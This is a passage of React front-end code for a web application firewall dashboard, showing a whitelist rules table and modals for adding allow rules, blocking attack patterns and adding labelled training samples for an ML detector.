      {/* ==================== TAB 4: WHITELISTS ==================== */}
      {activeTab === 'whitelists' && (
        <div>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px' }}>
            <h3 style={{ margin: 0 }}>Active Whitelist Exception Rules</h3>
            <button className="btn btn-success" onClick={() => handleOpenWhitelistModal()}>
              <i className="fas fa-plus"></i> Add Whitelist Rule
            </button>
          </div>

          {whitelistsLoading ? (
            <div style={{ textAlign: 'center', padding: '60px', color: s.textMuted }}>
              <i className="fas fa-circle-notch fa-spin fa-2x"></i>
              <p style={{ marginTop: '12px' }}>Loading whitelists...</p>
            </div>
          ) : whitelists.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '60px', background: s.bgCard, borderRadius: '16px', border: `1px dashed ${s.border}` }}>
              <h3>No Whitelist Rules</h3>
              <p style={{ color: s.textMuted }}>No active exception or whitelist patterns defined.</p>
            </div>
          ) : (
            <div style={{ background: s.bgCard, borderRadius: '16px', border: `1px solid ${s.border}`, overflow: 'hidden' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                <thead>
                  <tr style={{ background: dark ? 'rgba(0,0,0,0.3)' : 'rgba(0,0,0,0.02)', borderBottom: `1px solid ${s.border}` }}>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Rule Name</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Match Type</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Pattern / Target</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700 }}>Description</th>
                    <th style={{ padding: '14px 18px', fontWeight: 700, textAlign: 'right' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {whitelists.map(wl => (
                    <tr key={wl.id} style={{ borderBottom: `1px solid ${s.borderLight}` }}>
                      <td style={{ padding: '12px 18px', fontWeight: 700 }}>{wl.name}</td>
                      <td style={{ padding: '12px 18px' }}><code style={{ color: '#22c55e' }}>{wl.match_type}</code></td>
                      <td style={{ padding: '12px 18px', fontFamily: "'Fira Code', monospace" }}>{wl.pattern}</td>
                      <td style={{ padding: '12px 18px', color: s.textMuted }}>{wl.description}</td>
                      <td style={{ padding: '12px 18px', textAlign: 'right' }}>
                        <button className="btn btn-secondary" style={{ padding: '4px 8px', color: '#ef4444' }} onClick={() => handleDeleteWhitelist(wl.id)}>
                          <i className="fas fa-trash"></i>
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* ==================== MODALS ==================== */}

      {/* 1-Click Whitelist Modal */}
      {whitelistModalOpen && (
        <div className="modal-backdrop" onClick={() => setWhitelistModalOpen(false)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h3 style={{ marginTop: 0, display: 'flex', alignItems: 'center', gap: '8px', color: '#22c55e' }}>
              <i className="fas fa-shield-check"></i> Whitelist Request Pattern
            </h3>
            <p style={{ fontSize: '13px', color: s.textMuted, marginBottom: '20px' }}>
              This will create an immediate WAF bypass rule and record the sample as Benign (0) for continuous ML training.
            </p>

            <form onSubmit={handleWhitelistSubmit}>
              <div className="form-group">
                <label className="form-label">Rule Name</label>
                <input
                  type="text"
                  className="form-input"
                  value={whitelistForm.name}
                  onChange={e => setWhitelistForm({ ...whitelistForm, name: e.target.value })}
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">Match Type</label>
                <select
                  className="form-select"
                  value={whitelistForm.match_type}
                  onChange={e => setWhitelistForm({ ...whitelistForm, match_type: e.target.value })}
                >
                  <option value="contains">Contains Substring</option>
                  <option value="url_path">URL Path Prefix</option>
                  <option value="exact">Exact Match</option>
                  <option value="regex">Regular Expression</option>
                </select>
              </div>

              <div className="form-group">
                <label className="form-label">Pattern to Allow</label>
                <input
                  type="text"
                  className="form-input"
                  value={whitelistForm.pattern}
                  onChange={e => setWhitelistForm({ ...whitelistForm, pattern: e.target.value })}
                  style={{ fontFamily: "'Fira Code', monospace" }}
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">Description / Note</label>
                <input
                  type="text"
                  className="form-input"
                  value={whitelistForm.description}
                  onChange={e => setWhitelistForm({ ...whitelistForm, description: e.target.value })}
                  placeholder="e.g. Legitimate analytics payload"
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '24px' }}>
                <button type="button" className="btn btn-secondary" onClick={() => setWhitelistModalOpen(false)}>Cancel</button>
                <button type="submit" className="btn btn-success">
                  <i className="fas fa-check"></i> Confirm & Whitelist
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* 1-Click Blacklist & Learn Attack Modal */}
      {blacklistModalOpen && (
        <div className="modal-backdrop" onClick={() => setBlacklistModalOpen(false)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h3 style={{ marginTop: 0, display: 'flex', alignItems: 'center', gap: '8px', color: '#ef4444' }}>
              <i className="fas fa-ban"></i> Blacklist Attack & Feed ML Model
            </h3>
            <p style={{ fontSize: '13px', color: s.textMuted, marginBottom: '20px' }}>
              Creates an instant blocking regex rule in the WAF engine and labels the payload as Malicious (1) in the training dataset.
            </p>

            <form onSubmit={handleBlacklistSubmit}>
              <div className="form-group">
                <label className="form-label">Rule Name</label>
                <input
                  type="text"
                  className="form-input"
                  value={blacklistForm.name}
                  onChange={e => setBlacklistForm({ ...blacklistForm, name: e.target.value })}
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">Attack Category</label>
                <select
                  className="form-select"
                  value={blacklistForm.category}
                  onChange={e => setBlacklistForm({ ...blacklistForm, category: e.target.value })}
                >
                  <option value="SQL Injection">SQL Injection</option>
                  <option value="XSS">XSS (Cross-Site Scripting)</option>
                  <option value="Command Injection">Command Injection (RCE)</option>
                  <option value="SSRF">SSRF (Server-Side Request Forgery)</option>
                  <option value="Local File Inclusion">Local File Inclusion (LFI)</option>
                  <option value="Insecure Deserialization">Insecure Deserialization</option>
                  <option value="Path Traversal">Path Traversal</option>
                  <option value="Generic Attack">Generic Attack</option>
                </select>
              </div>

              <div className="form-group">
                <label className="form-label">Attack Pattern / Payload to Block</label>
                <textarea
                  rows={3}
                  className="form-textarea"
                  value={blacklistForm.pattern}
                  onChange={e => setBlacklistForm({ ...blacklistForm, pattern: e.target.value })}
                  style={{ fontFamily: "'Fira Code', monospace" }}
                  required
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '24px' }}>
                <button type="button" className="btn btn-secondary" onClick={() => setBlacklistModalOpen(false)}>Cancel</button>
                <button type="submit" className="btn btn-danger">
                  <i className="fas fa-shield"></i> Activate Block Rule & Learn
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Manual Sample Add Modal */}
      {addSampleModalOpen && (
        <div className="modal-backdrop" onClick={() => setAddSampleModalOpen(false)}>
          <div className="modal-content" onClick={e => e.stopPropagation()}>
            <h3 style={{ marginTop: 0 }}>Add Dataset Training Sample</h3>
            <form onSubmit={handleAddSampleSubmit}>
              <div className="form-group">
                <label className="form-label">Sample Label</label>
                <select
                  className="form-select"
                  value={sampleForm.label}
                  onChange={e => setSampleForm({ ...sampleForm, label: parseInt(e.target.value) })}
                >
                  <option value={1}>Malicious Attack (1)</option>
                  <option value={0}>Benign / Normal Request (0)</option>
                </select>
              </div>

              <div className="form-group">
                <label className="form-label">Category</label>
                <input
                  type="text"
                  className="form-input"
                  value={sampleForm.category}
                  onChange={e => setSampleForm({ ...sampleForm, category: e.target.value })}
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">Raw Payload String</label>
                <textarea
                  rows={3}
                  className="form-textarea"
                  value={sampleForm.payload}
                  onChange={e => setSampleForm({ ...sampleForm, payload: e.target.value })}
                  style={{ fontFamily: "'Fira Code', monospace" }}
                  required
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '24px' }}>
                <button type="button" className="btn btn-secondary" onClick={() => setAddSampleModalOpen(false)}>Cancel</button>
                <button type="submit" className="btn btn-primary">Save to Dataset</button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}
